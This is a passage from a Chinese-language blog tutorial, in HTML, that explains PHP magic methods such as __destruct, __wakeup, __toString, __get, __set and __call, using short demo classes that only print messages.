对象被销毁时触发</code>，它的栗子如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">bai</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__construct()初始化&lt;br>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//将传入的第一个参数赋值给name变量</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__destruct()执行结束&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\t\t\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token comment\">//主动销毁</span>\n <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">bai</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">unset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//主动销毁对象，此时先触发destruct魔法函数再echo</span>\n <span class=\"token keyword\">echo</span><span class=\"token string double-quoted-string\">\"777&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"------------分隔符----------------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">//自动销毁</span>\n <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">bai</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"123&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">//此时先echo再触发destruct函数</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545475.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"__sleep()\"></a>__sleep()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    serialize 之前被调用，可以指定要序列化的对象属性。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">bai</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__construct()初始化&lt;br>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"当使用serialize时触发此方法&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>   \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">bai</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545480.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"wakeup\"><a href=\"#wakeup\" class=\"headerlink\" title=\"__wakeup()\"></a>__wakeup()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   反序列化恢复对象之前调用该方法<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">bai</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__construct()初始化&lt;br>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"当使用unserialize时触发此方法&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//更改$age的值为1000</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">bai</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545964.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"__toString()\"></a>__toString()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> ：在对象当做字符串的时候会被调用。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'This is a string'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">good</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br />'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 在对象当做字符串的时候会被调用</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">'__toString方法被调用 &lt;br>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">good</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545993.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"invoke\"><a href=\"#invoke\" class=\"headerlink\" title=\"__invoke()\"></a>__invoke()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> ：将对象当作函数来使用时执行此方法。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"调用正常方法&lt;br>\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span><span class=\"token string double-quoted-string\">\"调用__invoke()方法\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545182.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"get\"><a href=\"#get\" class=\"headerlink\" title=\"__get\"></a>__get</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 访问不存在的成员变量时调用的<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$n</span><span class=\"token operator\">=</span><span class=\"token number\">123</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'__get方法被调用，其中不存在变量'</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">quan9i</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用对象a中的变量quan9i，由于不存在quan9i这个变量，这时候就会调用__get魔术方法</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545252.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> ：设置不存在的成员变量时调用的；<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xg</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$test</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'__set 不存在成员变量 '</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token operator\">=</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//调用Get方法，这里就是输出test的值</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token operator\">=</span> <span class=\"token number\">777</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 给私有变量test赋值为777，但此时它是私有变量，就会调用__set，此时就会更改</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">quan9i</span> <span class=\"token operator\">=</span> <span class=\"token number\">566</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置对象不存在的属性</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 经过__set方法的设置值为566</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545399.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545621.png\" alt=\"在这里插入图片描述\"></p>\n<p>不理解的话可以进行调试，可以看见这里在调用私有变量test后走向了__set魔术方法，然后$name就是我们调用的变量，$value就是我们设置的值777<br>再看这个本来不存在的变量，它也是会调用这个__set魔术方法的，你可以在这里打断点，调试一下会发现此时这里设置了$name=quan9i，$value=566<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545735.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"call\"><a href=\"#call\" class=\"headerlink\" title=\"__call()\"></a>__call()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">__call ：当调用对象中不存在的方法会自动调用该方法<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"调用正常方法&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__call被调用，Test类中不存在方法\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//调用正常方法</span>\n<span class=\"token keyword\">echo</span><span class=\"token string double-quoted-string\">\"--------------------分隔符----------------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">quan9i</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//调用一个不存在的方法，此时就调用了__call魔术方法</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545687.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"isset\"><a href=\"#isset\" class=\"headerlink\" title=\"isset()\"></a>isset()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> 检测对象的某个属性是否存在时执行此函数。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"当使用isset()函数，自动调用&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// public 成员</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// private 成员</span>\n<span class=\"token keyword\">echo</span> <span class=\"token keyword\">isset</span><span class=\"token 